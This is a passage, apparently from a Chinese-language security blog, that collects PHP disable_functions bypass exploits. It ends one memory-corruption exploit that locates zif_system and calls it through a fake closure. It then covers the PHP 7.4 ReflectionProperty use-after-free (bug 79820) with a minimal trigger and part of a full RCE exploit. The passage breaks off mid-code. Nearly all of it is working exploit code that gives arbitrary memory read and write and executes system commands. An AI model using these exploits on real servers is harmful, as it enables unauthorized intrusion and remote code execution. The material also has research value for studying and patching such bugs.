language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="hljs-variable">$basic_funcs</span>);<br><br>        <span class="hljs-variable">$zif_system</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;zif_system @ 0x%x&quot;</span>, <span class="hljs-variable">$zif_system</span>);<br><br>        <span class="hljs-variable">$fake_closure_off</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE * <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x138</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-variable">$i</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$closure_addr</span> + <span class="hljs-variable">$i</span>));<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="hljs-number">8</span> ? <span class="hljs-number">0x70</span> : <span class="hljs-number">0x68</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-variable">$handler_offset</span>, <span class="hljs-variable">$zif_system</span>);<br><br>        <span class="hljs-variable">$fake_closure_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_addr + <span class="hljs-variable">$fake_closure_off</span> - <span class="hljs-variable language_">$this</span>-&gt;helper_off;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;helper_off + <span class="hljs-number">0x38</span>, <span class="hljs-variable">$fake_closure_addr</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;fake closure @ 0x%x&quot;</span>, <span class="hljs-variable">$fake_closure_addr</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanup</span>();<br>        (<span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b)(CMD);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">make_uaf_obj</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;uafp = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://memory&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;uafp, <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;QQQ&#x27;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xDEADBAADC0DE</span>));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; STRING_SIZE; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;uafp, <span class="hljs-string">&quot;\x00&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prepare_leaker</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$str_off</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="hljs-number">8</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$str_off</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$str_off</span> + <span class="hljs-number">0x10</span>, <span class="hljs-number">6</span>);<br><br>        <span class="hljs-variable">$val_off</span> = <span class="hljs-variable language_">$this</span>-&gt;helper_off + <span class="hljs-number">0x48</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$val_off</span>, <span class="hljs-variable">$this</span>-&gt;helper_addr + CHUNK_SIZE + <span class="hljs-number">8</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$val_off</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0xA</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">prepare_cleanup</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$ret_gadget</span> = <span class="hljs-variable">$binary_leak</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            --<span class="hljs-variable">$ret_gadget</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$ret_gadget</span>, <span class="hljs-number">1</span>) !== <span class="hljs-number">0xC3</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;ret gadget = 0x%x&quot;</span>, <span class="hljs-variable">$ret_gadget</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0</span>, <span class="hljs-variable">$this</span>-&gt;abc_addr + <span class="hljs-number">0x20</span> - (PHP_MAJOR_VERSION === <span class="hljs-number">8</span> ? <span class="hljs-number">0x50</span> : <span class="hljs-number">0x60</span>));<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">8</span>, <span class="hljs-variable">$ret_gadget</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="hljs-number">16</span>, <span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;helper-&gt;c);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$n</span> !== <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$value</span> &amp;= (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-variable">$n</span> &lt;&lt; <span class="hljs-number">3</span>)) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;abc[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span></span>) </span>&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span><br>            <span class="hljs-comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span><br>            <span class="hljs-comment">// In that case, changing the direction of the search should fix the crash.</span><br>            <span class="hljs-comment">// $addr += 0x10;</span><br>            <span class="hljs-variable">$addr</span> -= <span class="hljs-number">0x10</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">4</span>) === <span class="hljs-number">0xA8</span> &amp;&amp;<br>                <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>),<br>                    [<span class="hljs-number">20151012</span>, <span class="hljs-number">20160303</span>, <span class="hljs-number">20170718</span>, <span class="hljs-number">20180731</span>, <span class="hljs-number">20190902</span>, <span class="hljs-number">20200930</span>])) &#123;<br>                <span class="hljs-variable">$module_name_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">0x20</span>);<br>                <span class="hljs-variable">$module_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$module_name_addr</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$module_name</span> === <span class="hljs-number">0x647261646e617473</span>) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;standard module @ 0x%x&quot;</span>, <span class="hljs-variable">$addr</span>);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">0x28</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">6</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> === <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> !== <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;hfp = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://memory&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;hfp, <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;QQ&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$this</span>-&gt;abc_addr));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; FILTER_SIZE - <span class="hljs-number">0x10</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$this</span>-&gt;hfp, <span class="hljs-string">&quot;\x00&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params"><span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$n</span> - <span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$this</span>-&gt;abc[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$format</span>, <span class="hljs-variable">$val</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(LOGGING) &#123;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="hljs-variable">$val</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">alloc</span>(<span class="hljs-params"><span class="hljs-variable">$size</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-variable">$size</span>));<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="php7-ReflectionProperty-UAF"><a href="#php7-ReflectionProperty-UAF" class="headerlink" title="php7_ReflectionProperty_UAF"></a>php7_ReflectionProperty_UAF</h2><p><strong>利用条件</strong></p><ul><li>7.4.x 版本上进行利用，最高可利用版本为 7.4.8。</li></ul><p><strong>原理</strong></p><p><a href="https://bugs.php.net/bug.php?id=79820">Use after free when type duplicated into ReflectionProperty gets resolved</a></p><p><strong>exp</strong></p><p>最简触发脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-built_in">stdClass</span> <span class="hljs-variable">$prop</span>;<br>&#125;<br><span class="hljs-variable">$rp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionProperty</span>(<span class="hljs-title class_">Test</span>::<span class="hljs-variable language_">class</span>, <span class="hljs-string">&#x27;prop&#x27;</span>);<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>;<br><span class="hljs-variable">$test</span>-&gt;prop = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$rp</span>-&gt;<span class="hljs-title function_ invoke__">getType</span>()-&gt;<span class="hljs-title function_ invoke__">getName</span>());<br></code></pre></td></tr></table></figure><p>rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> HelperHelperHelperHelperHelperHelperHelper <span class="hljs-variable">$prop</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelperHelperHelperHelperHelperHelperHelper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s2n</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">4</span>;<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>        <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-number">4</span> + <span class="hljs-variable">$i</span>]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s2b</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>, <span class="hljs-variable">$offset</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">s2n</span>(<span class="hljs-variable">$str</span>) + <span class="hljs-variable">$offset</span> - <span class="hljs-number">0x10</span>), <span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>,<br>        STR_PAD_LEFT));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">8</span>;<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$data</span> .= <span class="hljs-variable">$abc</span>[<span class="hljs-variable">$offset</span> + <span class="hljs-number">7</span> - <span class="hljs-variable">$i</span>];<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak2</span>(<span class="hljs-params"><span class="hljs-variable">$address</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$helper</span>;<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0x20</span>, <span class="hljs-variable">$address</span>);<br>    <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span> -&gt; b);<br>    <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$leak</span>);<br>    <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$leak</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>    <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$leak</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span>, <span class="hljs-variable">$data</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$data</span>, <span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>, STR_PAD_LEFT);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">8</span>;<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$abc</span>[<span class="hljs-variable">$offset</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-variable">$data</span>[<span class="hljs-number">7</span> - <span class="hljs-variable">$i</span>];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$std_object_handlers</span></span>) </span>&#123;<br>    <span class="hljs-variable">$prefix</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$std_object_handlers</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-variable">$std_object_handlers</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$std_object_handlers</span>));<br>    <span class="hljs-variable">$start</span> = <span class="hljs-variable">$std_object_handlers</span> &amp; <span class="hljs-number">0x00000000fffff000</span> | <span class="hljs-number">0x0000000000000920</span>;<br>    <span class="hljs-comment"># change 0x920 if finding failed</span><br><span class="hljs-variable">$NumPrefix</span> = <span class="hljs-variable">$std_object_handlers</span> &amp; <span class="hljs-number">0x0000ffffff000000</span>;<br><span class="hljs-variable">$NumPrefix</span> = <span class="hljs-variable">$NumPrefix</span> - <span class="hljs-number">0x0000000001000000</span>;<br><span class="hljs-variable">$funcs</span> = <span class="hljs-title function_ invoke__">get_defined_functions</span>()[<span class="hljs-string">&#x27;internal&#x27;</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>), <span class="hljs-number">8</span>,<br>                <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT))));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &gt; <span class="hljs-variable">$std_object_handlers</span> || <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &lt; <span class="hljs-variable">$NumPrefix</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$name_addr</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">s2b</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$name_addr</span>), <span class="hljs-number">0x00</span>)));<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-variable">$name</span>)[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$name</span>, <span 